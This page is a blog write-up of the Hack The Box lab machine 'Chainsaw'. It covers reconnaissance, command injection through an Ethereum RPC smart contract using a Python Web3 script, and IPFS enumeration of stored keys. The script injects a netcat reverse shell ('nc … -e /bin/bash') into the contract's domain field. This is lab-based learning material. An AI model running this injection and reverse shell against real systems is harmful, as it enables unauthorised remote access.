@@ -1,0 +1,894 @@
+<!doctype html>
+<html lang="en-US">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?">
+
+    <!-- Begin Jekyll SEO tag v2.6.1 -->
+<title>Chainsaw Writeup | Arti Karahoda</title>
+<meta name="generator" content="Jekyll v3.8.6" />
+<meta property="og:title" content="Chainsaw Writeup" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="This article will demonstrate a new vector of attack using Blockchain tools, commencing from an initial CMD injection through Ethereum’s RPC interface, SSH keys retrieval using the IPFS protocol, privilege escalation by stealing funds from a smart contract, and file system forensics in the slack space storage." />
+<meta property="og:description" content="This article will demonstrate a new vector of attack using Blockchain tools, commencing from an initial CMD injection through Ethereum’s RPC interface, SSH keys retrieval using the IPFS protocol, privilege escalation by stealing funds from a smart contract, and file system forensics in the slack space storage." />
+<link rel="canonical" href="http://localhost:4000/posts/chainsaw-writeup.html" />
+<meta property="og:url" content="http://localhost:4000/posts/chainsaw-writeup.html" />
+<meta property="og:site_name" content="Arti Karahoda" />
+<meta property="og:image" content="http://localhost:4000/assets/images/chainsaw3.png" />
+<script type="application/ld+json">
+{"@type":"WebPage","headline":"Chainsaw Writeup","image":"http://localhost:4000/assets/images/chainsaw3.png","url":"http://localhost:4000/posts/chainsaw-writeup.html","description":"This article will demonstrate a new vector of attack using Blockchain tools, commencing from an initial CMD injection through Ethereum’s RPC interface, SSH keys retrieval using the IPFS protocol, privilege escalation by stealing funds from a smart contract, and file system forensics in the slack space storage.","@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+
+    <meta property="og:type" content="article">
+    <meta property='article:author' content='Arti Karahoda'/>
+    <meta property="og:image:width" content="1200" />
+    <meta property="og:image:height" content="630" />
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+    <script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
+    <script src="/assets/js/respond.js"></script>
+    <!--[if lt IE 9]>
+      <script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script>
+    <![endif]-->
+    <!--[if lt IE 8]>
+    <link rel="stylesheet" href="/assets/css/ie.css">
+    <![endif]-->
+    <meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, user-scalable=yes">
+    <div id="_progress"></div>
+<a id="button"></a>
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css">
+
+<style>
+html, body {
+  overflow-x: hidden;
+}
+
+#_progress {
+      --scroll: 0%;
+      background: linear-gradient(to right,rgb(0, 143, 105) var(--scroll),transparent 0);
+      width: 100%;
+      height: 5px;
+      left: 0px;
+      right: 0px;
+      position: fixed;
+      height: 5px;
+      top:0px;
+      z-index: 100;
+  }
+
+#button {
+  display: inline-block;
+  background-color: #FF9800;
+  width: 50px;
+  height: 50px;
+  text-align: center;
+  border-radius: 4px;
+  position: fixed;
+  bottom: 30px;
+  right: 30px;
+  transition: background-color .3s, 
+    opacity .5s, visibility .5s;
+  opacity: 0;
+  visibility: hidden;
+  z-index: 1000;
+}
+#button::after {
+  content: "\f077";
+  font-family: FontAwesome;
+  font-weight: normal;
+  font-style: normal;
+  font-size: 2em;
+  line-height: 50px;
+  color: #fff;
+}
+#button:hover {
+  cursor: pointer;
+  background-color: #333;
+}
+#button:active {
+  background-color: #555;
+}
+#button.show {
+  opacity: 1;
+  visibility: visible;
+}
+</style>
+
+<script>
+document.addEventListener(
+  "scroll",
+  function() {
+    var scrollTop =
+      document.documentElement["scrollTop"] || document.body["scrollTop"];
+    var scrollBottom =
+      (document.documentElement["scrollHeight"] ||
+        document.body["scrollHeight"]) - document.documentElement.clientHeight;
+    scrollPercent = scrollTop / scrollBottom * 100 + "%";
+    document
+      .getElementById("_progress")
+      .style.setProperty("--scroll", scrollPercent);
+  },
+  { passive: true }
+);
+</script>
+
+<script>
+var btn = $('#button');
+
+$(window).scroll(function() {
+  if ($(window).scrollTop() > 300) {
+    btn.addClass('show');
+  } else {
+    btn.removeClass('show');
+  }
+});
+
+btn.on('click', function(e) {
+  e.preventDefault();
+  $('html, body').animate({scrollTop:0}, '300');
+});
+</script>
+    <style>
+section #title {
+  padding:0;
+}
+#nav {
+  list-style-type: none !important;
+  margin: 0;
+  padding: 0;
+  overflow: hidden;
+  list-style-image: none !important;
+}
+
+#nav li {
+  float: left;
+}
+
+#nav li a {
+  display: block;
+  color: white;
+  text-align: center;
+  padding: 8px 8px;
+  text-decoration: none;
+}
+
+#nav li a:hover {
+  background-color: #111;
+}
+
+*:focus {
+  outline:none !important
+}
+    </style>
+  <div id="_progress"></div>
+<a id="button"></a>
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css">
+
+<style>
+html, body {
+  overflow-x: hidden;
+}
+
+#_progress {
+      --scroll: 0%;
+      background: linear-gradient(to right,rgb(0, 143, 105) var(--scroll),transparent 0);
+      width: 100%;
+      height: 5px;
+      left: 0px;
+      right: 0px;
+      position: fixed;
+      height: 5px;
+      top:0px;
+      z-index: 100;
+  }
+
+#button {
+  display: inline-block;
+  background-color: #FF9800;
+  width: 50px;
+  height: 50px;
+  text-align: center;
+  border-radius: 4px;
+  position: fixed;
+  bottom: 30px;
+  right: 30px;
+  transition: background-color .3s, 
+    opacity .5s, visibility .5s;
+  opacity: 0;
+  visibility: hidden;
+  z-index: 1000;
+}
+#button::after {
+  content: "\f077";
+  font-family: FontAwesome;
+  font-weight: normal;
+  font-style: normal;
+  font-size: 2em;
+  line-height: 50px;
+  color: #fff;
+}
+#button:hover {
+  cursor: pointer;
+  background-color: #333;
+}
+#button:active {
+  background-color: #555;
+}
+#button.show {
+  opacity: 1;
+  visibility: visible;
+}
+</style>
+
+<script>
+document.addEventListener(
+  "scroll",
+  function() {
+    var scrollTop =
+      document.documentElement["scrollTop"] || document.body["scrollTop"];
+    var scrollBottom =
+      (document.documentElement["scrollHeight"] ||
+        document.body["scrollHeight"]) - document.documentElement.clientHeight;
+    scrollPercent = scrollTop / scrollBottom * 100 + "%";
+    document
+      .getElementById("_progress")
+      .style.setProperty("--scroll", scrollPercent);
+  },
+  { passive: true }
+);
+</script>
+
+<script>
+var btn = $('#button');
+
+$(window).scroll(function() {
+  if ($(window).scrollTop() > 300) {
+    btn.addClass('show');
+  } else {
+    btn.removeClass('show');
+  }
+});
+
+btn.on('click', function(e) {
+  e.preventDefault();
+  $('html, body').animate({scrollTop:0}, '300');
+});
+</script>
+  </head>
+  <body>
+    <div class="wrapper">
+      <section>
+        <div id="title">
+          <h1>Arti Karahoda</h1>
+          <p>Cyber Security & Data Protection</p>
+          <ul id="nav">
+              <li><a href="/">Home</a></li>
+              <li><a href="/#posts">Posts</a></li>
+              <li><a href="/#-whoami">About</a></li>
+              <li><a href="/#contact">Contact</a></li>
+            </ul>
+          <hr></div>
+
+        <style>
+.wrapper {
+  max-width: 700px;
+}
+section {
+  max-width: 700px;
+  padding: 30px 0px 0px 0px;
+}
+pre, code {
+    white-space: pre-wrap;
+}
+@media all and (max-width:480px) {
+    img {float:center;display:block;margin:0 auto;}
+}
+
+@media all and (min-width:480px) {
+    img {float:left;padding-right:30px;margin:0 auto;}
+}
+img {
+    margin-bottom:8px;
+}
+</style>
+
+<p><i><strong>23 November, 2019</strong> — <a href="../">Go back to homepage</a> </i></p>
+<h1 id="hack-the-box--chainsaw-writeup">Hack the Box / Chainsaw Writeup</h1>
+
+<p><img style="margin-top:10px;" id="chainsaw1" width="300" height="285" src="/assets/images/chainsaw1.png" /></p>
+<h3 id="technical-specifications">Technical Specifications</h3>
+<ul>
+  <li><strong>Operating System:</strong> Linux</li>
+  <li><strong>Static IP:</strong> 10.10.10.142</li>
+  <li><strong>Difficulty:</strong> <span style="color:red;">Hard</span></li>
+  <li><strong>Key Words:</strong> Ethereum RPC, IPFS, Slack Space</li>
+</ul>
+
+<h3 id="exploitation-phases">Exploitation Phases</h3>
+<ul>
+  <li><a href="#1-information-gathering">Information Gathering</a></li>
+  <li><a href="#2-command-injection">Command Injection</a></li>
+  <li><a href="#3-local-enumeration">Local Enumeration</a></li>
+  <li><a href="#4-privilege-escalation">Privilege Escalation</a></li>
+  <li><a href="#5-forensics">Forensics</a></li>
+</ul>
+
+<h2 id="executive-summary">Executive Summary</h2>
+
+<p>This document contains written techniques to successfully exploit the “Chainsaw” box, commencing from a command injection through Ethereum’s Remote Procedure Call (RPC) interface, using the InterPlanetary File System (IPFS) protocol to retrieve Secure Shell (SSH) private keys, followed by escalating to root shell through making a valid transaction to steal funds from a smart contract, and finally performing file system forensics to get the root flag hidden in slack space.</p>
+
+<h2 id="1-information-gathering">1. Information Gathering</h2>
+
+<p>As usually, we start with <code class="highlighter-rouge">nmap</code> to check which ports are open on the server:</p>
+
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span><span class="w"> </span><span class="nb">mkdir </span>nmap
+<span class="gp">$</span><span class="w"> </span>nmap <span class="nt">-sC</span> <span class="nt">-oA</span> nmap/initial 10.10.10.142 <span class="nt">-p-</span>
+<span class="c">...
+</span><span class="go">PORT     STATE SERVICE
+21/tcp   open  ftp
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| -rw-r--r--    1 1001     1001        23828 Dec 05 13:02 WeaponizedPing.json
+| -rw-r--r--    1 1001     1001          243 Dec 12 23:46 WeaponizedPing.sol
+|_-rw-r--r--    1 1001     1001           44 Dec 13 00:12 address.txt
+| ftp-syst:
+|   STAT:
+| FTP server status:
+|      Connected to ::ffff:10.10.14.3
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 3
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+22/tcp   open  ssh
+| ssh-hostkey:
+|   2048 02:dd:8a:5d:3c:78:d4:41:ff:bb:27:39:c1:a2:4f:eb (RSA)
+|   256 3d:71:ff:d7:29:d5:d4:b2:a6:4f:9d:eb:91:1b:70:9f (ECDSA)
+|_  256 7e:02:da:db:29:f9:d2:04:63:df:fc:91:fd:a2:5a:f2 (ED25519)
+9810/tcp open  unknown
+</span><span class="c">...</span></code></pre></figure>
+
+<p>There are three (3) services running in the box. The first interesting one is FTP running on port 21 which seems to have anonymous login enabled with the following files: <em>WeaponizedPing.json</em>, <em>WeaponizedPing.sol</em>, and <em>address.txt</em>. Moreover, besides SSH running on port 22 which has the password authentication mechanism disabled (implies key usage), there is one more unknown service running on port 9810 which <code class="highlighter-rouge">nmap</code> could not get fingerprint information from.</p>
+
+<p>We will first download the public files using <code class="highlighter-rouge">ftp</code> with download confirmation prompt disabled <em>(-i):</em></p>
+
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span><span class="w"> </span>ftp <span class="nt">-i</span> 10.10.10.142
+<span class="gp">ftp&gt;</span><span class="w"> </span>mget <span class="k">*</span>
+<span class="gp">ftp&gt;</span><span class="w"> </span><span class="nb">exit</span></code></pre></figure>
+
+<p>We commence by taking a look at <em>WeaponizedPing.sol:</em></p>
+
+<figure class="highlight"><pre><code class="language-java" data-lang="java"><span class="n">pragma</span> <span class="n">solidity</span> <span class="o">^</span><span class="mf">0.4</span><span class="o">.</span><span class="mi">24</span><span class="o">;</span>
+
+<span class="n">contract</span> <span class="nc">WeaponizedPing</span>
+<span class="o">{</span>
+        <span class="n">string</span> <span class="n">store</span> <span class="o">=</span> <span class="s">"google.com"</span><span class="o">;</span>
+
+        <span class="n">function</span> <span class="nf">getDomain</span><span class="o">()</span> <span class="kd">public</span> <span class="n">view</span> <span class="nf">returns</span> <span class="o">(</span><span class="n">string</span><span class="o">)</span>
+        <span class="o">{</span>
+            <span class="k">return</span> <span class="n">store</span><span class="o">;</span>
+        <span class="o">}</span>
+
+        <span class="n">function</span> <span class="nf">setDomain</span><span class="o">(</span><span class="n">string</span> <span class="n">_value</span><span class="o">)</span> <span class="kd">public</span>
+        <span class="o">{</span>
+            <span class="n">store</span> <span class="o">=</span> <span class="n">_value</span><span class="o">;</span>
+        <span class="o">}</span>
+<span class="o">}</span></code></pre></figure>
+
+<p>The above source code seems to be written for Solidity version 0.4.24 that represents a simple smart contract built on top of the Ethereum technology. A contract in the sense of Solidity is a collection of code (its functions) and data (its state) that resides at a specific address on the blockchain. There are two functions implemented in the contract, <span style="color:#a6e22e;">getDomain()</span> which returns the value of the store variable (in this case, initial value is “<em>google.com</em>”) and <span style="color:#a6e22e;">setDomain()</span> which allows you to override said value.</p>
+
+<p>On the other hand, <em>WeaponizedPing.json</em> holds the configuration file for the smart contract in the JSON format, and <em>address.txt</em> the address value to uniquely identify the contract, generated by computer program, where storage can be fetched or set – in our case, a domain name.</p>
+
+<p>Based on the functionality of the source code and its name, <em>WeaponizedPing</em>, which may or may not be a ping service to test if a domain or IP address is reachable, then we might look into command injection – which is common in these instances.</p>
+
+<h2 id="2-command-injection">2. Command Injection</h2>
+
+<p>Visiting <a href="http://10.10.10.142:9810/">http://10.10.10.142:9810/</a> will simply output a HTTP bad request error code of 400. Taking into consideration information gathered from the reconnaissance process, the mention of blockchain technology and Ethereum on top of it may imply that port 9810 can be a potentially RPC interface to Ethereum clients – a service which became popular in 2017 due to the cryptocurrency publicity.</p>
+
+<p>Our main objective is to gain the ability to modify and manipulate the domain value, and for that, we will develop a script in Python 3 to craft our request.</p>
+
+<p>To interact with Ethereum, we will use the <a href="https://web3py.readthedocs.io/en/stable/">Web3</a> library (which can be installed using <code class="highlighter-rouge">pip</code>) and we will use <a href="https://www.sitepoint.com/compiling-smart-contracts-abi/">two essential elements</a>, besides contract’s address, from the configuration file provided:</p>
+
+<ul>
+  <li>Ethereum bytecode for WeaponizedPing – The executable code of smart contract running on the stack-based Ethereum Virtual Machine (EVM);</li>
+  <li>Application Binary Interface (ABI) – Which allows us to contextualize the contract and call its functions.</li>
+</ul>
+
+<p>We will be using various functions from <code class="highlighter-rouge">Web3</code> to establish a connection with the RPC interface using <code class="highlighter-rouge">Web3.HTTPProvider</code>, load necessary values through <code class="highlighter-rouge">eth.defaultAccount</code> and finally the custom function <code class="highlighter-rouge">setDomain()</code> to override <em>“google.com”</em> to <em>“hackthebox.eu”</em>:</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1">#!/usr/bin/python3
+# -*- coding: utf-8 -*-
+</span><span class="kn">import</span> <span class="nn">json</span><span class="p">,</span> <span class="n">subprocess</span>
+<span class="kn">import</span> <span class="nn">netifaces</span> <span class="k">as</span> <span class="n">ni</span>
+<span class="kn">from</span> <span class="nn">web3</span> <span class="kn">import</span> <span class="n">Web3</span>
+
+<span class="k">def</span> <span class="nf">run_exploit</span><span class="p">(</span><span class="n">ip</span><span class="p">):</span>
+	<span class="c1"># Store Ethereum contract address
+</span>	<span class="n">caddress</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">'address.txt'</span><span class="p">,</span> <span class="s">'r'</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+	<span class="n">caddress</span> <span class="o">=</span> <span class="n">caddress</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">,</span> <span class="s">''</span><span class="p">)</span>
+
+	<span class="c1"># Load Ethereum contract configuration
+</span>	<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">'WeaponizedPing.json'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+		<span class="n">contractData</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">load</span><span class="p">(</span><span class="n">f</span><span class="p">)</span>
+
+	<span class="c1"># Establish a connection with the Ethereum RPC interface
+</span>	<span class="n">w3</span> <span class="o">=</span> <span class="n">Web3</span><span class="p">(</span><span class="n">Web3</span><span class="o">.</span><span class="n">HTTPProvider</span><span class="p">(</span><span class="s">'http://10.10.10.142:9810'</span><span class="p">))</span>
+	<span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">defaultAccount</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">accounts</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
+
+	<span class="c1"># Get Application Binary Interface (ABI) and Ethereum bytecode
+</span>	<span class="n">Url</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">contract</span><span class="p">(</span><span class="n">abi</span><span class="o">=</span><span class="n">contractData</span><span class="p">[</span><span class="s">'abi'</span><span class="p">],</span>      
+                       <span class="n">bytecode</span><span class="o">=</span><span class="n">contractData</span><span class="p">[</span><span class="s">'bytecode'</span><span class="p">])</span>
+	<span class="n">contractInstance</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">contract</span><span class="p">(</span><span class="n">address</span><span class="o">=</span><span class="n">caddress</span><span class="p">,</span>  
+                                      <span class="n">abi</span><span class="o">=</span><span class="n">contractData</span><span class="p">[</span><span class="s">'abi'</span><span class="p">])</span>
+
+	<span class="c1"># Calling the function of contract to set a new domain
+</span>	<span class="n">url</span> <span class="o">=</span> \
+         <span class="n">contractInstance</span><span class="o">.</span><span class="n">functions</span><span class="o">.</span><span class="n">setDomain</span><span class="p">(</span><span class="s">'hackthebox.eu'</span><span class="p">)</span><span class="o">.</span><span class="n">transact</span><span class="p">()</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
+	<span class="k">try</span><span class="p">:</span>
+		<span class="n">ni</span><span class="o">.</span><span class="n">ifaddresses</span><span class="p">(</span><span class="s">'tun0'</span><span class="p">)</span>
+		<span class="n">ip</span> <span class="o">=</span> <span class="n">ni</span><span class="o">.</span><span class="n">ifaddresses</span><span class="p">(</span><span class="s">'tun0'</span><span class="p">)[</span><span class="n">ni</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">][</span><span class="mi">0</span><span class="p">][</span><span class="s">'addr'</span><span class="p">]</span>
+	<span class="k">except</span><span class="p">:</span>
+		<span class="k">print</span><span class="p">(</span><span class="s">'[*] Failed to fetch local IP address'</span><span class="p">)</span>
+
+	<span class="n">run_exploit</span><span class="p">(</span><span class="n">ip</span><span class="p">)</span></code></pre></figure>
+
+<p>To confirm our code is working, we will set our IP address as the domain value:</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">url</span> <span class="o">=</span> <span class="n">contractInstance</span><span class="o">.</span><span class="n">functions</span><span class="o">.</span><span class="n">setDomain</span><span class="p">(</span><span class="s">'{}'</span><span class="o">.</span><span class="nb">format</span><span class="p">(</span><span class="n">ip</span><span class="p">))</span><span class="o">.</span><span class="n">transact</span><span class="p">()</span></code></pre></figure>
+
+<p>And sure enough, a single ICMP request will appear in our <code class="highlighter-rouge">tcpdump</code>:</p>
+
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span><span class="w"> </span>tcpdump <span class="nt">-i</span> eth0 icmp
+<span class="c">...
+</span><span class="gp">03:36:05.225134 IP 10.10.10.142 &gt;</span><span class="w"> </span>10.10.14.3: ICMP <span class="nb">echo </span>request, <span class="nb">id </span>1, <span class="nb">seq </span>96, length 40
+<span class="gp">03:36:05.225173 IP 10.10.14.3 &gt;</span><span class="w"> </span>10.10.10.142: ICMP <span class="nb">echo </span>reply, <span class="nb">id </span>1, <span class="nb">seq </span>96, length 40
+<span class="c">...</span></code></pre></figure>
+
+<p>This means that the software is most likely running a system command to <code class="highlighter-rouge">ping</code> once a retrieved value of the domain. Taking this fact into consideration, we can then inject arbitrary commands after the domain name through piping, such as using <code class="highlighter-rouge">netcat</code> (assuming it is installed in the box) to spawn a reverse shell:</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">rl</span> <span class="o">=</span> <span class="n">contractInstance</span><span class="o">.</span><span class="n">functions</span><span class="o">.</span><span class="n">setDomain</span><span class="p">(</span><span class="s">'hackthebox.eu | nc {} 9191 -e /bin/bash'</span><span class="o">.</span><span class="nb">format</span><span class="p">(</span><span class="n">ip</span><span class="p">))</span><span class="o">.</span><span class="n">transact</span><span class="p">()</span>
+
+<span class="c1"># Start netcat handler for reverse shell
+</span><span class="n">subprocess</span><span class="o">.</span><span class="n">call</span><span class="p">([</span><span class="s">"nc -lvnp 9191"</span><span class="p">],</span> <span class="n">shell</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">stderr</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">STDOUT</span><span class="p">)</span></code></pre></figure>
+
+<p>This will pop a shell as user <em>administrator</em> in which no user flag is found, meaning that we need to continue with local enumeration.</p>
+
+<p>Fully automated and formatted code for the exploit can be found in my <a href="https://gist.github.com/artikrh/b53ac84a65610084f7ddd8cd00546d0c">public gist</a>. As you may notice, the script also leverages <code class="highlighter-rouge">ftplib</code> to fetch the newly generated blockchain address each time the machine is reset; this is a detail quite a number of people had to learn the hard way:</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="k">def</span> <span class="nf">getFiles</span><span class="p">():</span>
+	<span class="n">ftp</span> <span class="o">=</span> <span class="n">ftplib</span><span class="o">.</span><span class="n">FTP</span><span class="p">(</span><span class="n">TARGET_IP</span><span class="p">)</span>
+	<span class="n">ftp</span><span class="o">.</span><span class="n">login</span><span class="p">(</span><span class="s">'anonymous'</span><span class="p">,</span> <span class="s">'chainsaw'</span><span class="p">)</span>
+
+	<span class="n">filenames</span> <span class="o">=</span> <span class="n">ftp</span><span class="o">.</span><span class="n">nlst</span><span class="p">()</span>
+
+	<span class="k">for</span> <span class="n">filename</span> <span class="ow">in</span> <span class="n">filenames</span><span class="p">:</span>
+		<span class="k">if</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">exists</span><span class="p">(</span><span class="n">filename</span><span class="p">):</span>
+			<span class="n">os</span><span class="o">.</span><span class="n">remove</span><span class="p">(</span><span class="n">filename</span><span class="p">)</span>
+		<span class="nb">file</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="s">'wb'</span><span class="p">)</span>
+		<span class="n">ftp</span><span class="o">.</span><span class="n">retrbinary</span><span class="p">(</span><span class="s">'RETR '</span><span class="o">+</span> <span class="n">filename</span><span class="p">,</span> <span class="nb">file</span><span class="o">.</span><span class="n">write</span><span class="p">)</span>
+
+		<span class="nb">file</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+
+	<span class="n">ftp</span><span class="o">.</span><span class="n">quit</span><span class="p">()</span></code></pre></figure>
+
+<p><u>Note</u>: You can also use the <a href="https://www.npmjs.com/package/web3">NodeJS Web3</a> or <a href="https://github.com/ethereum/go-ethereum/wiki/geth">geth</a> command line interface implemented in Go language to interact with the JSON RPC; the same result can be also achieved through <code class="highlighter-rouge">curl</code>:</p>
+
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span><span class="w"> </span>curl 10.10.10.142:9810 <span class="nt">-X</span> POST <span class="nt">--data</span> <span class="s1">'{"jsonrpc":"2.0","method":"eth_call","params":[{"from": "0xa6bcc6ac459ad9d568f0d11365cd5541496bf008", "to": "0x4a3e40bb27f21d30d51f636f31b129c3c9956177", "data": "0xb68d1809"}, "latest"]}'</span>
+<span class="go">
+{"jsonrpc":"2.0","result":"0x0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000002b31302e31302e31342e332026206e63202d6520272f62696e277368272031302e31302e31342e3320343433000000000000000000000000000000000000000000"}</span></code></pre></figure>
+
+<h2 id="3-local-enumeration">3. Local Enumeration</h2>
+
+<p>By a quick overview of administrator’s home folder, we will notice a CSV file, a <em>maintain</em> directory and a couple of hidden directories.</p>
+
+<p>The CSV file holds information about Chainsaw employees with their usernames, role status, and role descriptions. It seems that only the user <em>bobby</em>, who is a smart contract auditor, is the only one active at the moment, and we can confirm this by his home directory presence in <em>/home</em> and a valid Unix shell in <em>/etc/passwd</em>. In conclusion, we need to escalate to <em>bobby</em> to grab the user flag.</p>
+
+<p>The <em>maintain</em> directory seems to contain employees public RSA keys (which were probably generated from the <em>gen.py</em> script – which also generates encrypted private keys, except, they are the ones missing).</p>
+
+<p>Furthermore, among hidden directories in which mostly have little to no value, <em>.ipfs</em> is an interesting one which may give us necessary information to proceed further in this box. InterPlanetary File System (IPFS) is a peer-to-peer network protocol that utilizes distributed systems (including blockchain) with its main objective of hypermedia sharing.</p>
+
+<p>With the aim of replacing HTTP, it is an open source project available on <a href="https://github.com/ipfs/ipfs">GitHub</a>, therefore, it is already available for installation in different systems, including Linux – where we can confirm its presence by issuing a simple <a href="https://docs.ipfs.io/reference/api/cli/">command</a> to retrieve our own peer information:</p>
+
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span><span class="w"> </span>ipfs <span class="nb">id</span>
+<span class="go">{
+        "ID": "QmPfaAfb157bVHC1Y3waMEkX5QHjrF5UrvHqcNdp4R1BGy",
+        "PublicKey": "CAASpgIwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDeME8+9MUmzPvifqnqC7dM4rtPfqOn4STLZxC5OgizeavrygOubfKosRdRkKNkm9DdNTsR5gB9QANiHkRnQ57bLwheH4o895Ib/lW/WOhwmOtks1iV9VIUj7DTnuQDNcN2IuVcnpC8x5HFQoNIgsj2HgqxLnlPCJboaTYo3oGwflqE2o2+/pwZjM2My3ux9FYCg7GhEpXO6WGpH6Jxq2Z3wOA1z1qVSOmAPSPgSOvvFGvKyfU6ntta8qd3EC15x4002CB9OSA/pTbchSTr3gS9QOMq5Wn55vEwNaOFNf/qOImaRWYER8epyHB/E4kKJ9XAeL7U7xfKpQDhrqvEdq2/AgMBAAE=",
+        "Addresses": null,
+        "AgentVersion": "go-ipfs/0.4.18/",
+        "ProtocolVersion": "ipfs/0.1.0"
+}</span></code></pre></figure>
+
+<p>In IPFS, every link/file is identified with a unique hash. However, as seen from the process list, IPFS daemon is not running which means that it is only running locally.</p>
+
+<p>To list all objects stored in the local IPFS repository, we will use the following command:</p>
+
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span><span class="w"> </span>ipfs refs <span class="nb">local</span>
+<span class="go">QmYCvbfNbCwFR45HiNP45rwJgvatpiW38D961L5qAhUM5Y
+QmPctBY8tq2TpPufHuQUbe2sCxoy2wD5YRB6kdce35ZwAx
+QmbwWcNc7TZBUDFzwW7eUTAyLE2hhwhHiTXqempi1CgUwB
+QmdL9t1YP99v4a2wyXFYAQJtbD9zKnPrugFLQWXBXb82sn
+QmSKboVigcD3AY4kLsob117KJcMHvMUu6vNFqk1PQzYUpp
+</span><span class="c">...
+</span><span class="go">QmZZRTyhDpL5Jgift1cHbAhexeE1m2Hw8x8g7rTcPahDvo
+QmUH2FceqvTSAvn6oqm8M49TNDqowktkEx4LgpBx746HRS
+QmcMCDdN1qDaa2vaN654nA4Jzr6Zv9yGSBjKPk26iFJJ4M
+QmPZ9gcCEpqKTo6aq61g2nXGUhM4iCL3ewB6LDXZCtioEB
+Qmc7rLAhEh17UpguAsEyS4yfmAbeqSeSEz4mZZRNcW52vV</span></code></pre></figure>
+
+<p>These objects could be either files or directories. To skip a lot of unnecessary output that the files might have, we will try to list (<code class="highlighter-rouge">ipfs ls</code>) information about these hashes.</p>
+
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span><span class="w"> </span><span class="k">for </span>i <span class="k">in</span> <span class="si">$(</span>ipfs refs <span class="nb">local</span><span class="si">)</span><span class="p">;</span> <span class="k">do </span>ipfs <span class="nb">ls</span> <span class="nv">$i</span> 2&gt; /dev/null<span class="p">;</span> <span class="k">done</span><span class="p">;</span>
+<span class="go">QmXWS8VFBxJPsxhF8KEqN1VpZf52DPhLswcXpxEDzF5DWC 391 arti.key.pub
+QmPjsarLFBcY8seiv3rpUZ2aTyauPF3Xu3kQm56iD6mdcq 391 bobby.key.pub
+QmUHHbX4N8tUNyXFK9jNfgpFFddGgpn72CF1JyNnZNeVVn 391 bryan.key.pub
+QmUH2FceqvTSAvn6oqm8M49TNDqowktkEx4LgpBx746HRS 391 lara.key.pub
+QmcMCDdN1qDaa2vaN654nA4Jzr6Zv9yGSBjKPk26iFJJ4M 391 wendy.key.pub
+QmZrd1ik8Z2F5iSZPDA2cZSmaZkHFEE4jZ3MiQTDKHAiri 45459 mail-log/
+QmbwWcNc7TZBUDFzwW7eUTAyLE2hhwhHiTXqempi1CgUwB 10063 artichain600-protonmail-2018-12-13T20_50_58+01_00.eml
+QmViFN1CKxrg3ef1S8AJBZzQ2QS8xrcq3wHmyEfyXYjCMF 4640  bobbyaxelrod600-protonmail-2018-12-13-T20_28_54+01_00.eml
+QmZxzK6gXioAUH9a68ojwkos8EaeANnicBJNA3TND4Sizp 10084 bryanconnerty600-protonmail-2018-12-13T20_50_36+01_00.eml
+QmegE6RZe59xf1TyDdhhcNnMrsevsfuJHUynLuRc4yf6V1 10083 laraaxelrod600-protonmail-2018-12-13T20_49_35+01_00.eml
+QmXwXzVYKgYZEXU1dgCKeejT87Knw9nydGcuUZrjwNb2Me 10092 wendyrhoades600-protonmail-2018-12-13T20_50_15+01_00.eml
